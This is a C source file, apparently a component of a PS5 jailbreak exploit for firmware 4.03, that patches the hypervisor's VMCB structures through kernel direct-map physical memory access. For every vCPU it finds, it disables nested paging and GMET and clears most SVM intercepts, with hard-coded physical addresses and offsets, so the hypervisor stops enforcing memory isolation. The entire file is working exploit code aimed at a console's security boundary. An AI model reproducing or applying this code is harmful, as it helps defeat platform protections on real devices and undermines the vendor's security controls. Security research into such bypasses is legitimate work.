/*
 * VMCB (Virtual Machine Control Block) patching via direct x86 DMAP access.
 *
 * Ported from fail0verflow's prosperous exploit for PS5 FW 4.03.
 *
 * The PS5 hypervisor uses AMD SVM (Secure Virtual Machine) with nested
 * paging to isolate guest (kernel) memory from the hypervisor. The VMCB
 * structure controls VM execution, including:
 *   - Instruction intercepts (offset 0x00-0x14)
 *   - Nested paging control (offset 0x90)
 *
 * By disabling nested paging (NP_ENABLE=0) and clearing intercepts,
 * the kernel gains direct access to all physical memory without HV
 * mediation. This also disables GMET (Guest Mode Execute Trap) which
 * is part of the NDA (Non-Debug Area) enforcement.
 *
 * Previous approach: read/write VMCB via MP4 A53 coprocessor (SYSHUB DMA).
 * Current approach: read/write VMCB directly from x86 via DMAP after TMR
 * bypass. This eliminates the A53 code execution requirement entirely —
 * no payload injection, no I-cache flush, no SYSHUB TLB setup needed.
 *
 * Memory layout:
 *   - vcpu_ctxs_pa (0x628485D0): Array of vCPU context structures
 *   - Each vCPU ctx has a pointer to its VMCB at offset +0x08
 *   - The HV VA base is at PA 0x62848000
 *   - VMCB PA = VMCB VA - hv_va_base
 */

#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <ps5/kernel.h>
#include "prosperous.h"

/* Number of vCPU contexts to patch (PS5 has up to 16 logical CPUs) */
#define MAX_VCPUS   16

/* vCPU context structure stride */
#define VCPU_CTX_SIZE   0x320

/* Offset of VMCB pointer within vCPU context */
#define VCPU_CTX_VMCB_OFF  0x08

/*
 * Read/write helpers via DMAP.
 * After HV TMR disable, x86 can directly access HV physical memory.
 */
static inline uint32_t dmap_read32(uint64_t dmap_base, uint64_t pa)
{
    return kernel_getint((intptr_t)(dmap_base + pa));
}

static inline uint64_t dmap_read64(uint64_t dmap_base, uint64_t pa)
{
    return kernel_getlong((intptr_t)(dmap_base + pa));
}

static inline void dmap_write32(uint64_t dmap_base, uint64_t pa, uint32_t val)
{
    kernel_setint((intptr_t)(dmap_base + pa), val);
}

static inline void dmap_write64(uint64_t dmap_base, uint64_t pa, uint64_t val)
{
    kernel_setlong((intptr_t)(dmap_base + pa), val);
}

/*
 * Patch all VMCB structures to disable nested paging and most intercepts.
 *
 * Prerequisites:
 *   - HV TMR regions disabled (tmr_disable_hv_regions)
 *
 * For each vCPU:
 *   1. Read VMCB pointer from vCPU context (via DMAP)
 *   2. Convert HV VA -> PA using hv_va_base
 *   3. Set NP_CTRL to 0 (disable nested paging + GMET)
 *   4. Clear most intercept vectors (keep VMSAVE/VMLOAD/VMMCALL/VMRUN)
 *
 * This is a destructive operation - once done, the HV no longer enforces
 * memory isolation. The kernel can access all physical memory directly.
 */
int vmcb_patch_disable_np(struct phys_rw_ctx *ctx)
{
    uint64_t dmap = ctx->dmap_base;
    uint64_t vcpu_ctxs_pa = VCPU_CTXS_PA;
    uint64_t hv_va_base;
    int patched = 0;

    /* Read HV VA base from the HV data area.
     * The first qword at PA 0x62848000 contains the HV's virtual address base. */
    hv_va_base = dmap_read64(dmap, 0x62848000ULL);
    printf("[VMCB] HV VA base: 0x%llx\n", (unsigned long long)hv_va_base);

    if (hv_va_base == 0 || hv_va_base == 0xFFFFFFFFFFFFFFFFULL) {
        printf("[!] VMCB: Invalid HV VA base — TMR not disabled?\n");
        return -1;
    }

    /* Iterate over all vCPU contexts and patch their VMCBs */
    for (int i = 0; i < MAX_VCPUS; i++) {
        uint64_t ctx_pa = vcpu_ctxs_pa + VCPU_CTX_SIZE * i + VCPU_CTX_VMCB_OFF;
        uint64_t vmcb_va, vmcb_pa;
        uint64_t np_ctrl;

        /* Read VMCB virtual address from vCPU context */
        vmcb_va = dmap_read64(dmap, ctx_pa);
        if (vmcb_va == 0)
            continue;

        /* Convert HV VA to PA */
        vmcb_pa = vmcb_va - hv_va_base;

        /* Read NP_CTRL (offset 0x90 in VMCB) */
        np_ctrl = dmap_read64(dmap, vmcb_pa + VMCB_NP_CTRL);

        /* If already zero, VMCBs were previously modified */
        if (np_ctrl == 0)
            break;

        /* Sanity check: NP_CTRL should be 0x09 (NP_ENABLE=1 + some flags) */
        if ((np_ctrl & 0xFF) != 0x09) {
            printf("[!] VMCB %d: unexpected NP_CTRL=0x%llx\n",
                   i, (unsigned long long)np_ctrl);
            return -3;
        }

        /* Disable nested paging: set NP_ENABLE=0, GMET=0 */
        dmap_write64(dmap, vmcb_pa + VMCB_NP_CTRL, 0);

        /* Read current intercept vectors */
        uint32_t vec3 = dmap_read32(dmap, vmcb_pa + VMCB_INTERCEPT_VEC3);

        /* Preserve CPUID intercept bit (may be needed for compatibility) */
        uint32_t intercept_cpuid = vec3 & (1 << 18);

        /* Clear all intercepts in vec0 */
        dmap_write32(dmap, vmcb_pa + VMCB_INTERCEPT_VEC0, 0);

        /* Set vec3 to only CPUID intercept (if it was set) */
        if (vec3 != intercept_cpuid)
            dmap_write32(dmap, vmcb_pa + VMCB_INTERCEPT_VEC3, intercept_cpuid);

        /* Keep VMSAVE(0x1), VMLOAD(0x2), VMMCALL(0x4), VMRUN(0x8) in vec4.
         * Without these, process context switches hang. */
        dmap_write32(dmap, vmcb_pa + VMCB_INTERCEPT_VEC4, 0x0F);

        patched++;
        printf("[VMCB] Patched vCPU %d: VMCB PA=0x%llx, NP 0x%llx→0\n",
               i, (unsigned long long)vmcb_pa, (unsigned long long)np_ctrl);
    }

    printf("[VMCB] Patched %d VMCBs\n", patched);
    return 0;
}
